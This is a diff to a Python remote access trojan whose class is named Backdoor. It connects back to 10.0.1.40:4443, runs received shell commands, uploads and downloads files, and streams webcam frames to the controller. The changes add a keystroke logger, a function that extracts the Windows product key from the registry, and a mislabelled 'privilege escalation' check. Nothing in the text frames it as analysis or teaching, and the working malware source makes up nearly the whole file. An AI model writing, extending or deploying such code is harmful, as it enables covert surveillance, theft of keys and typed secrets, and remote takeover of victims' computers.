@@ -5,57 +5,71 @@ import os
 import base64
 import cv2
 import threading
-import time
+import keyboard
 import winreg
-import wmi
+
+# Helper functions for Windows key retrieval
+def decode_key(rpk):
+    rpkOffset = 52
+    i = 28
+    szPossibleChars = "BCDFGHJKMPQRTVWXY2346789"
+    szProductKey = ""
+
+    while i >= 0:
+        dwAccumulator = 0
+        j = 14
+        while j >= 0:
+            dwAccumulator = dwAccumulator * 256
+            d = rpk[j + rpkOffset]
+            if isinstance(d, str):
+                d = ord(d)
+            dwAccumulator = d + dwAccumulator
+            rpk[j + rpkOffset] = int(dwAccumulator / 24) if int(dwAccumulator / 24) <= 255 else 255
+            dwAccumulator = dwAccumulator % 24
+            j = j - 1
+        i = i - 1
+        szProductKey = szPossibleChars[dwAccumulator] + szProductKey
+
+        if ((29 - i) % 6) == 0 and i != -1:
+            i = i - 1
+            szProductKey = "-" + szProductKey
+    return szProductKey
+
+def get_windows_key():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion')
+        value, _ = winreg.QueryValueEx(key, 'DigitalProductID')
+        return decode_key(list(value))
+    except:
+        return "Failed to retrieve Windows key"
+
+# Webcam streaming
+def webcam_stream(send_frame):
+    cap = cv2.VideoCapture(0)
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        # Draw a blue square on the frame
+        height, width, _ = frame.shape
+        start_point = (int(width / 3), int(height / 3))
+        end_point = (int(2 * width / 3), int(height / 3) + 50)
+        color = (255, 0, 0)  # Blue color
+        thickness = 2
+        cv2.rectangle(frame, start_point, end_point, color, thickness)
+        _, jpeg = cv2.imencode('.jpg', frame)
+        send_frame(jpeg.tobytes())
+    cap.release()
+
+# Keylogger variables
+keylog = []
+keylogger_active = False
 
 class Backdoor:
     def __init__(self, ip, port):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((ip, port))
-        self.camera = cv2.VideoCapture(0)
-
-    def decode_key(self, rpk):
-        rpk_offset = 52
-        i = 28
-        possible_chars = "BCDFGHJKMPQRTVWXY2346789"
-        product_key = ""
-
-        while i >= 0:
-            dw_accumulator = 0
-            j = 14
-            while j >= 0:
-                dw_accumulator = dw_accumulator * 256
-                d = rpk[j + rpk_offset]
-                if isinstance(d, str):
-                    d = ord(d)
-                dw_accumulator = d + dw_accumulator
-                rpk[j + rpk_offset] = int(dw_accumulator / 24) if int(dw_accumulator / 24) <= 255 else 255
-                dw_accumulator = dw_accumulator % 24
-                j = j - 1
-            i = i - 1
-            product_key = possible_chars[dw_accumulator] + product_key
-
-            if ((29 - i) % 6) == 0 and i != -1:
-                i = i - 1
-                product_key = "-" + product_key
-        return product_key
-
-    def get_windows_product_key(self):
-        try:
-            w = wmi.WMI()
-            product_key = w.softwarelicensingservice()[0].OA3xOriginalProductKey
-            if product_key:
-                return product_key
-        except AttributeError:
-            pass
-
-        try:
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, winreg.KEY_READ)
-            value, _ = winreg.QueryValueEx(key, "DigitalProductID")
-            return self.decode_key(list(value))
-        except FileNotFoundError:
-            return None
+        self.shell_active = False
 
     def execute(self, command):
         try:
@@ -67,7 +81,7 @@ class Backdoor:
         json_data = json.dumps(data)
         self.s.send(json_data.encode())
 
-    def recieve_json(self):
+    def receive_json(self):
         json_data = ""
         while True:
             try:
@@ -92,23 +106,43 @@ class Backdoor:
             file.write(base64.b64decode(content))
             return "[+] Upload successful [+]"
 
-    def stream_webcam(self):
-        while True:
-            ret, frame = self.camera.read()
-            if not ret:
-                break
+    def escalate_privileges(self):
+        if os.name == 'nt':
+            try:
+                subprocess.run("whoami /groups | find \"S-1-5-32-544\"", shell=True, check=True)
+                return "[+] SYSTEM privileges acquired [+]"
+            except:
+                return "[-] Failed to escalate privileges [-]"
+        else:
+            return "[-] Not a Windows system [-]"
 
-            _, buffer = cv2.imencode('.jpg', frame)
-            frame_data = base64.b64encode(buffer).decode()
-            self.send_json({"type": "webcam_frame", "data": frame_data})
-            time.sleep(0.03)  # Adds 0.03 seconds delay before sending the next frame
+    def keylogger_start(self):
+        global keylog, keylogger_active
+        keylog = []
+        keylogger_active = True
+        def log_keys():
+            while keylogger_active:
+                event = keyboard.read_event()
+                if event.event_type == keyboard.KEY_DOWN:
+                    key = event.name
+                    if key not in ["caps lock", "ctrl", "num lock", "print screen", "shift", "enter"]:
+                        keylog.append(key if key != "space" else " ")
+                    elif key == "enter":
+                        keylog.append("[ENTER]")
+        threading.Thread(target=log_keys, daemon=True).start()
+        return "[+] Keylogger started [+]"
+
+    def keylogger_dump(self):
+        return "".join(keylog)
+
+    def keylogger_stop(self):
+        global keylogger_active
+        keylogger_active = False
+        return "[+] Keylogger stopped [+]"
 
     def run(self):
-        webcam_thread = threading.Thread(target=self.stream_webcam, daemon=True)
-        webcam_thread.start()
-
         while True:
-            command = self.recieve_json()
+            command = self.receive_json()
             try:
                 if command[0] == "exit":
                     self.s.close()
@@ -119,14 +153,30 @@ class Backdoor:
                     command_output = self.read_file(command[1])
                 elif command[0] == "upload":
                     command_output = self.write_file(command[1], command[2])
-                elif command[0] == "get_windows_key":
-                    command_output = self.get_windows_product_key()
+                elif command[0] == "get-key":
+                    command_output = get_windows_key()
+                elif command[0] == "webcam_stream":
+                    def send_frame(frame):
+                        self.send_json({"frame": base64.b64encode(frame).decode()})
+                    threading.Thread(target=webcam_stream, args=(send_frame,), daemon=True).start()
+                    command_output = "[+] Webcam streaming started [+]"
+                elif command[0] == "shell":
+                    self.shell_active = True
+                    command_output = "[+] Interactive shell started [+]"
+                elif command[0] == "!getsystem" and self.shell_active:
+                    command_output = self.escalate_privileges()
+                elif command[0] == "keymon":
+                    if command[1] == "start":
+                        command_output = self.keylogger_start()
+                    elif command[1] == "dump":
+                        command_output = self.keylogger_dump()
+                    elif command[1] == "stop":
+                        command_output = self.keylogger_stop()
                 else:
                     command_output = self.execute(command)
             except Exception:
                 command_output = "[+] Error during execution of the command [+]"
-            self.send_json({"type": "command_output", "data": command_output})
-
+            self.send_json(command_output)
 
 backdoor = Backdoor("10.0.1.40", 4443)
 backdoor.run()
